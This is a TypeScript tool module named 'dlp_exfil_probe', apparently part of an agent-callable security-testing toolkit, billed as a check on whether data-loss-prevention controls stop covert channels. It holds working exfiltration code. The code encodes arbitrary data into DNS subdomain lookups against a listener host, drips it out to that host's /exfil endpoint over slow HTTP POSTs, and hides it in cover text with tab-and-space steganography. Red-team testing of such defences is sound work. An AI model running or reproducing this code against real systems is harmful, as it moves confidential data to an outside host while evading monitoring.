// T78 — dlp_exfil_probe
// Data exfiltration channel testing: DNS tunnel, slow drip, steganography.

import * as dns from 'node:dns';
import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'dlp_exfil_probe',
  description:
    'Data exfiltration channel probe. Tests DNS tunnelling (base32-encodes data into subdomain labels), ' +
    'slow-drip HTTP exfil (rate-aware byte splitter), and whitespace steganography. Used to verify ' +
    'whether DLP controls block covert exfiltration channels.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'data',          type: 'string', required: true,  description: 'Data to exfiltrate (test payload)' },
    { name: 'channels',      type: 'string', required: false, description: 'JSON array of channels: dns_tunnel / slow_drip / stego', default: '["dns_tunnel","slow_drip","stego"]' },
    { name: 'listener_host', type: 'string', required: false, description: 'Listener host for DNS tunnel / slow drip callbacks' },
    { name: 'listener_port', type: 'number', required: false, description: 'Listener port for slow drip HTTP callback', default: 80 },
    { name: 'bytes_per_sec', type: 'number', required: false, description: 'Rate limit for slow drip (bytes/sec)', default: 100 },
    { name: 'timeout_ms',    type: 'number', required: false, description: 'Per-channel timeout ms', default: 30000 },
  ],
};

function base32Encode(buf: Buffer): string {
  const alphabet = 'abcdefghijklmnopqrstuvwxyz234567';
  let result = '';
  let bits = 0;
  let value = 0;
  for (const byte of buf) {
    value = (value << 8) | byte;
    bits += 8;
    while (bits >= 5) {
      bits -= 5;
      result += alphabet[(value >> bits) & 31];
    }
  }
  if (bits > 0) result += alphabet[(value << (5 - bits)) & 31];
  return result;
}

function whitespaceStego(data: string, coverText: string): string {
  // Encode data as binary, then encode 1=tab, 0=space after each word
  const binary = Buffer.from(data).toString('binary').split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join('');
  const words = coverText.split(' ');
  const result: string[] = [];
  for (let i = 0; i < words.length; i++) {
    result.push(words[i]);
    if (i < binary.length) result.push(binary[i] === '1' ? '\t' : ' ');
    else result.push(' ');
  }
  return result.join('');
}

export const dlpExfilProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const data = String(params.data || '');
    const listenerHost = params.listener_host ? String(params.listener_host) : undefined;
    const listenerPort = Number(params.listener_port || 80);
    const bytesPerSec = Number(params.bytes_per_sec || 100);
    const timeoutMs = Number(params.timeout_ms || 30000);

    if (!data) return { output: 'data required', parsed: { error: 'missing_data' } };

    let channels: string[] = ['dns_tunnel', 'slow_drip', 'stego'];
    try { if (params.channels) channels = JSON.parse(String(params.channels)); } catch { /* ignore */ }

    const results: Array<{ channel: string; sent: boolean; bytes_sent: number; method: string; note: string; error?: string }> = [];

    // DNS Tunnel
    if (channels.includes('dns_tunnel') && listenerHost) {
      try {
        const encoded = base32Encode(Buffer.from(data));
        // Split into 63-char chunks (max DNS label length)
        const chunks = encoded.match(/.{1,60}/g) || [];
        let sentCount = 0;

        for (let i = 0; i < Math.min(chunks.length, 5); i++) {
          const label = `${chunks[i]}.${i}.exfil.${listenerHost}`;
          await new Promise<void>((resolve) => {
            dns.resolve(label, () => resolve()); // fire and forget; error expected
          });
          sentCount++;
        }

        results.push({
          channel: 'dns_tunnel',
          sent: true,
          bytes_sent: data.length,
          method: `DNS lookups: ${sentCount} × base32-encoded subdomain labels → *.exfil.${listenerHost}`,
          note: `${chunks.length} chunks of 60 chars each; resolver log at ${listenerHost} would show: ${encoded.substring(0, 40)}...`,
        });
      } catch (err) {
        results.push({ channel: 'dns_tunnel', sent: false, bytes_sent: 0, method: 'dns', note: 'DNS tunnel failed', error: String(err) });
      }
    } else if (channels.includes('dns_tunnel')) {
      // Simulate without actual exfil (no listener_host)
      const encoded = base32Encode(Buffer.from(data));
      const chunks = encoded.match(/.{1,60}/g) || [];
      results.push({
        channel: 'dns_tunnel',
        sent: false,
        bytes_sent: 0,
        method: 'simulation (no listener_host provided)',
        note: `Would send ${chunks.length} DNS queries. Sample label: "${encoded.substring(0, 40)}.0.exfil.<listener>"`,
      });
    }

    // Slow Drip HTTP
    if (channels.includes('slow_drip') && listenerHost) {
      const url = `http://${listenerHost}:${listenerPort}/exfil`;
      const chunkSize = Math.max(1, Math.floor(bytesPerSec / 10)); // chunk per 100ms
      let bytesSent = 0;

      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);

        // Build a ReadableStream that drips data at the configured rate
        const dataBytes = Buffer.from(data);
        const stream = new ReadableStream({
          async pull(ctrl) {
            if (bytesSent >= dataBytes.length) { ctrl.close(); return; }
            const chunk = dataBytes.slice(bytesSent, bytesSent + chunkSize);
            ctrl.enqueue(chunk);
            bytesSent += chunk.length;
            await new Promise(r => setTimeout(r, 100)); // 100ms per chunk = bytesPerSec rate
          },
        });

        await fetch(url, { method: 'POST', body: stream, signal: controller.signal, headers: { 'Content-Type': 'application/octet-stream' } }).catch(() => {});
        clearTimeout(timer);

        results.push({
          channel: 'slow_drip',
          sent: bytesSent > 0,
          bytes_sent: bytesSent,
          method: `HTTP POST at ${bytesPerSec} bytes/sec in ${chunkSize}-byte chunks`,
          note: `Sent ${bytesSent}/${data.length} bytes to ${url}`,
        });
      } catch (err) {
        results.push({ channel: 'slow_drip', sent: bytesSent > 0, bytes_sent: bytesSent, method: 'http_slow_drip', note: 'slow drip error', error: String(err) });
      }
    } else if (channels.includes('slow_drip')) {
      results.push({
        channel: 'slow_drip',
        sent: false,
        bytes_sent: 0,
        method: 'simulation (no listener_host provided)',
        note: `Would POST ${data.length} bytes at ${bytesPerSec} B/s to http://<listener>:${listenerPort}/exfil`,
      });
    }

    // Whitespace steganography
    if (channels.includes('stego')) {
      const coverText = 'The quarterly report shows significant improvements in our core business metrics. Revenue growth has exceeded expectations by a considerable margin this fiscal year.';
      const encoded = whitespaceStego(data.substring(0, 32), coverText);
      const preview = Buffer.from(encoded).toString('hex').substring(0, 60);
      results.push({
        channel: 'stego',
        sent: false,
        bytes_sent: data.length > 32 ? 32 : data.length,
        method: 'whitespace steganography (tab=1, space=0 after each word)',
        note: `Encoded ${Math.min(32, data.length)} bytes into cover text. Hex preview of encoded: ${preview}...`,
      });
    }

    const lines = [
      `dlp_exfil_probe — ${data.length} bytes  channels=${channels.join(',')}`,
      `Listener: ${listenerHost || 'none (simulation mode)'}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.sent ? '⚡ SENT    ' : '  ·       ';
      lines.push(`  ${flag}  [${r.channel.padEnd(16)}]  ${r.method}`);
      lines.push(`            ${r.note}`);
      if (r.error) lines.push(`            Error: ${r.error.substring(0, 60)}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { data_length: data.length, channels: channels, results },
    };
  },
};
